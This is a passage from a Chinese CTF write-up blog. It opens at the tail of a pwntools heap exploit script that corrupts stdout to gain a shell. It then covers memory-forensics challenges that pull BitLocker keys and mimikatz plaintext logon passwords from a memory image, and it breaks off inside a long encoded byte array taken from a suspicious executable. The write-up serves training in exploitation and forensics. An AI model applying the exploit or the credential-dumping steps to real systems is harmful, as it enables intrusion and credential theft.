punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token number">0x240</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">13</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>stdout<span class="token operator">-</span><span class="token number">0x33</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    throw<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x33</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xfbad1887</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>stack<span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>stack<span class="token operator">+</span><span class="token number">0x28</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">#gdb.attach(io)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>   <span class="token keyword">try</span><span class="token punctuation">:</span>    <span class="token comment">#io=process('./lemon_pwn')</span>    <span class="token comment">#io = remote('47.104.70.90',34524)</span>    exp<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token keyword">except</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><hr><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="层层取证"><a href="#层层取证" class="headerlink" title="层层取证"></a>层层取证</h3><p>volatility 内存取证，使用 bitlocker 插件可得如下内容。</p><pre class="language-none"><code class="language-none">Volatility Foundation Volatility Framework 2.6.1Address : 0xfa800d12e7e0Cipher  : AES-128FVEK    : 0ff9192acdbf1df3c6dc36fb58cf76ceTWEAK   : b423bd84872ff72b583bb9bdee1762ac</code></pre><p>使用 bdemount 可解密 bitlocker 磁盘分区，然后使用 mount 挂载，可以得到一个2.pcapng。</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sudo</span> bdemount -k 0ff9192acdbf1df3c6dc36fb58cf76ce:b423bd84872ff72b583bb9bdee1762ac ext.dd /mnt/mount1</code></pre><p>使用 mimikatz 插件可以得到下列内容。</p><pre class="language-none"><code class="language-none">Volatility Foundation Volatility Framework 2.6.1Module   User             Domain           Password-------- ---------------- ---------------- ----------------------------------------wdigest  XiaoMing         PC               xiaoming_handsomewdigest  PC$              WORKGROUP</code></pre><p>使用 FTK Imager 加载磁盘后在 XiaoMing 用户的桌面发现了 flag.txt 提示需要仿真。使用 VMware 加载 FTK Imager 挂载的物理磁盘新建虚拟机，使用 Oracle Virtual Box 启动虚拟机来仿真。</p><img src="/article/2021xyb/c09803d05f1e71c6e555bb1190c5fc8.jpg" class="" title="c09803d05f1e71c6e555bb1190c5fc8" loading="lazy"><p>对流量包使用 WireShark 分析，UDP 流 32 处有压缩包。</p><img src="/article/2021xyb/image-0655563.png" class="" title="image" loading="lazy"><p>将其提取出来后在注释中可发现提示，其解压密码与电脑登录密码一致。解压后得到 Word 文档，使用上述便签上的密码解密即可得到 flag。</p><h3 id="考古"><a href="#考古" class="headerlink" title="考古"></a>考古</h3><p>本题我们拿了一血，可惜<small>啧啧 发生了一些事情</small></p><p>使用 volatility 对内存镜像进行分析，在用户的桌面可以发现一个可疑的 exe 文件，将其提取出来。使用如下脚本解出来 data。</p><pre class="language-none"><code class="language-none">#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main()&#123;  FILE *v4; &#x2F;&#x2F; [esp+10h] [ebp-14h]  int k; &#x2F;&#x2F; [esp+14h] [ebp-10h]  signed int j; &#x2F;&#x2F; [esp+18h] [ebp-Ch]  int i; &#x2F;&#x2F; [esp+1Ch] [ebp-8h]  char *key &#x3D; &quot;this_a_key&quot;;  unsigned char data[] &#x3D;&#123;  164, 167, 120, 147, 254, 208,  69, 138, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  97,  97,  92, 107, 155, 134,   125, 104, 111, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  94,  97,  95, 107, 110, 121,   116, 104, 105, 115,  95,  97,  95, 123, 101, 121,   122, 104, 105, 115,  94,  97,  95, 107, 155, 134,   139, 151, 105, 115,  95,  97,  83, 107, 101, 121,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151,  59, 115,  48,  97,  48, 107,  17, 121,    84, 104,  44, 115,  49,  97,  43, 107,  23, 121,    13, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  73, 107,  96, 121,   139, 151, 150, 140, 160, 158, 160, 148, 102, 121,   116, 104, 105, 122,  93,  97,  95, 107, 101, 121,   180, 104, 105, 115,  95,  97,  95,  45, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   132, 132,  14, 203, 176,  27, 136, 106,  96, 121,   116, 104, 233, 127,  95,  97,  95, 107, 101, 121,   117, 104,  42, 115,  48,  97,  50, 107,  21, 121,    59, 104,  11, 115,  53,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  77,  97,  93, 106, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,    26, 104, 105, 115,  95,  97,  95, 107,  50, 121,    27, 104,  27, 115,  59,  97,  27, 107,  10, 121,    23, 104,  28, 115,  50,  97,  58, 107,  11, 121,     0, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 115, 115,  93,  96, 160, 148, 154, 134,   112, 104, 105, 115, 160, 158, 160, 148, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  93,  97,  95, 107,  55, 115,   116, 104, 105, 115,  95,  97,  16, 107,   7, 121,    30, 104,  12, 115,  60,  97,  43, 107,  53, 121,    27, 104,   6, 115,  51,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,    98, 104, 104, 114,  94,  97,  95, 107, 103, 121,   116, 104, 150, 140, 160, 158,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97, 127, 171, 175, 213,   155,  18, 190, 114, 127, 161, 149, 199, 138,   3,   163, 105, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  93,  97,  95, 107, 152, 134,   139, 151, 151, 140, 160, 158, 161, 148, 154, 134,   115, 104, 105, 115,  89,  97,  95, 107,  97, 121,   116, 104,  97, 115,  95,  97,  86, 107, 101, 121,   126, 104, 105, 115, 161, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158,  90, 107,  54, 121,     1, 104,   4, 115,  50,  97,  62, 107,  23, 121,    13, 104,  32, 115,  49,  97,  57, 107,  10, 121,     6, 104,   4, 115,  62,  97,  43, 107,  12, 121,    27, 104,   7, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,    92, 104, 107, 115, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 121, 115,  95,  97,  25, 106, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 100, 121,   116, 104, 151, 140, 160, 158,  92, 107, 101, 121,   112, 104, 105, 115,  90,  97,  95, 107,  99, 121,   116, 104, 110, 115,  95,  97,  87, 107, 101, 121,   125, 104, 105, 115,  85,  97,  95, 107, 110, 121,   116, 104, 101, 115,  95,  97,  82, 107, 101, 121,   122, 104, 105, 115,  80,  97,  95, 107, 115, 121,   116, 104, 120, 115,  95,  97,  77, 107, 101, 121,   103, 104, 105, 115,  75,  97,  95, 107, 112, 121,   116, 104, 151, 140, 160, 158,  72, 107, 101, 121,   108, 104, 105, 115,  70,  97,  95, 107, 127, 121,   116, 104, 114, 115,  95,  97,  67, 107, 101, 121,   105, 104, 105, 115,  65,  97,  95, 107, 122, 121,   116, 104,  73, 115,  95,  97, 126, 107, 101, 121,    86, 104, 105, 115, 124,  97,  95, 107,  65, 121,   116, 104,  76, 115,  95,  97, 121, 107, 101, 121,    83, 104, 105, 115, 119,  97,  95, 107,  76, 121,   116, 104,  67, 115,  95,  97, 116, 107, 101, 121,    88, 104, 105, 115, 114,  97,  95, 107,  75, 121,   116, 104,  70, 115,  95,  97, 111, 107, 101, 121,    69, 104, 105, 115, 161, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   138, 151, 105, 115,  91,  97,  93, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  94,  97,  95, 107, 133, 252,   235, 154, 144,  60,  55, 113, 244, 250, 109, 121,    95,  79, 218, 170, 111,  97,  95, 107, 115, 120,   116, 104,  99, 115,  95,  97,  88, 107, 101, 121,   236, 104, 105, 115,  93,  97,  95, 107, 203, 121,   116, 104,  97, 115,  95,  97, 224, 107, 101, 121,   117, 104, 105, 115, 148,  97,  95, 107, 106, 121,   116, 104, 184, 115,  95,  97,  79, 107, 101, 121,   173, 104, 105, 115,  77,  97,  95, 107, 132, 121,   116, 104, 103, 115,  95,  97, 163, 107, 101, 121,   125, 104, 105, 115,  91,  96,  95, 107, 118, 121,   116, 104, 103, 114,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   106, 104, 105, 115,  81,  97,  95, 107,  38,  67,    40,  38,   6,   1,  50,   0,  51,  69,   1,  22,     0, 104, 119, 115,  95,  97,  86, 107, 101, 121,    39,  29,  11,  83,  18,  32,  22,  37, 101, 103,   116, 104, 105, 119,  95,  97,  95,  18,  12,  23,   116, 106, 105, 115,  95, 133,  91, 104, 101, 121,   116, 104, 105, 115,  95,  98,  95, 107, 101, 121,   116, 104, 105, 109,  95,  97,  95, 120, 101, 121,   116,  37,   0,  16,  45,  14,  44,   4,   3,  13,    84,  63,   6,   1,  59,  65, 105,  69,  85, 121,   119, 104, 105, 115,  95,  97,  95, 107, 123, 121,   116, 104, 107, 115,  95,  97, 106, 107, 102, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115, 102,  28,  89,  15, 127,  98,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 104, 115, 161, 158,  92,  97, 101, 121,   139, 151, 150, 140,  95, 104,  93, 107, 101, 121,   116, 104, 169, 115,  95,  97,  95, 107, 101,  63,   104, 104, 105, 115,  18,   8,  60,  25,  10,  10,    27,  14,  29,  83,   8,  14,  45,  15,  69,  79,    90,  88,  73,  55,  48,   2,  42,   6,   0,  23,     0, 104,  99, 115,  95,  97,  18,  56,  50,  22,     6,  12,  45,  28,  60,  97,  79, 107, 101, 121,    35,   7,  27,  23, 113,  37,  48,   8,  16,  20,    17,   6,  29,  93, 105,  97, 171,  82, 215,   8,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   168, 205,   1, 115,  26, 161,  86, 111, 101, 121,    81, 104,  12, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  98,  95, 107,  46, 122,   116, 104,  59, 121,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104,  34, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 113,   116, 104, 229, 115,  95,  97,  95,  99, 101, 121,   248, 104, 105, 115, 211, 105,  95, 107, 101, 121,   116, 104, 229, 123,  95,  97,  95, 107, 101, 121,   248,  96, 105, 115,  95,  97,  95, 107, 233, 113,   116, 104, 105, 115,  95,  97, 211,  99, 101, 121,    96, 104, 105, 115, 155, 105,  95, 107, 101, 121,   116, 104, 223, 123,  95,  97,  81, 107, 101, 121,   176,  96, 105, 115,  95,  97,  95, 107, 161, 113,   116, 104, 105, 115,  95,  97, 155,  99, 101, 121,   116, 104, 105, 115, 155, 105,  95, 107, 111, 121,   116, 104, 167, 123,  95,  97,  85, 107, 101, 121,   176,  96, 105, 115,  95,  97,  95, 107, 253, 112,   116, 104,  42, 115,  95,  97, 135,  99, 101, 121,   116, 104, 105, 115, 135, 105,  95, 107, 101, 121,   116, 104, 177, 123,  95,  97,  95, 107, 101, 121,   172,  96, 105, 115,  95,  97,  95, 107, 189, 113,   116, 104, 105, 115,  95,  97, 135,  99, 101, 121,   116, 104, 105, 115, 135, 105,  95, 107, 101, 121,   116, 104, 177, 123,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107,  52, 112,   116, 104, 105, 115,  95,  97,  14,  98, 101, 121,   116, 104, 105, 115,  14, 104,  95, 107, 101, 121,   116, 104,  56, 122,  95,  97,  95, 107, 101, 121,    37,  97, 105, 115,  95,  97,  95, 107,  52, 112,   116, 104, 119, 115,  95,  97, 132,  98, 101, 121,    44, 104, 105, 115, 108, 107,  95, 107, 122, 121,   116, 104,   6, 122,  95,  97, 118, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97, 211,  99, 101, 121,   116, 104, 105, 115, 135, 105,  95, 107, 101, 121,   116, 104, 105, 115,  93,  97,  92, 107, 100, 121,   117, 104, 177, 123,  95,  97,  95, 107, 101, 121,   172,  96, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115, 135, 105,  95, 107, 101, 121,   116, 104, 177, 123,  95,  97,  95, 107, 101, 121,    27,  97, 105, 115,  95,  97,  95, 107, 189, 113,   116, 104, 105, 115,  95,  97, 211,  99, 101, 121,   116, 104, 105, 115, 211, 105,  95, 107, 101, 121,   116, 104, 177, 123,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97, 135,  99, 101, 121,   116, 104, 105, 115, 135, 105,  95, 107, 101, 121,   116, 104, 177, 123,  95,  97,  95, 107, 101, 121,   172,  96, 105, 115,  95,  97,  95, 107, 189, 113,   116, 104, 105, 115,  95,  97, 211,  99, 101, 121,   116, 104, 105, 115, 135, 105,  95, 107, 101, 121,   116, 104, 229, 123,  95,  97,  95, 107, 101, 121,   172,  96, 105, 115,  95,  97,  95, 107, 122, 112,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 201, 123,  95,  97,  87, 107, 101, 121,   220,  96, 105, 115,  81,  97,  95, 107, 233, 113,   116, 104, 105, 115,  95,  97, 211,  99, 101, 121,   116, 104, 105, 115, 211, 105,  95, 107, 101, 121,   116, 104, 229, 123,  95,  97,  95, 107, 101, 121,   172,  96, 105, 115,  95,  97,  95, 107, 122, 112,   116, 104, 105, 115,  95,  97, 135,  99, 101, 121,    51, 104, 105, 115, 135, 105,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107,  40,   0,    84,  14,  27,  26,  58,  15,  59,  71,  69,  48,    84,  27,   8,  26,  59,  77, 127,  31,  13,  28,     6,  13,  73,  26,  44,  65,  45,  14,   4,  21,    24,  17,  73,  29,  48,  65,  57,   7,   4,  30,    84,   0,  12,   1,  58,  77, 127,  28,  13,   0,    84,  12,   6,  29, 205,  21, 127,  18,  10,  12,    84,  10,  12,  31,  54,   4,  41,  14,  69,  20,    17,  87, 100,  95, 114,  40, 105,  47,  76,  25,    24,  12,  10,  58,  21, 103, 114,  67,  34, 114,    63,  41,  37,  57,   9, 116,  16,  35,  44,  50,    61,  39,  38,  60,  19, 120,  64, 114, 123,  48,   104, 125, 113, 102,  17,  47,  64,  39, 125,  97,   105, 116, 118,  58,  65, 124,  95, 104, 101, 121,    63, 107, 105, 115, 217,  98,  95, 107, 101, 135,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 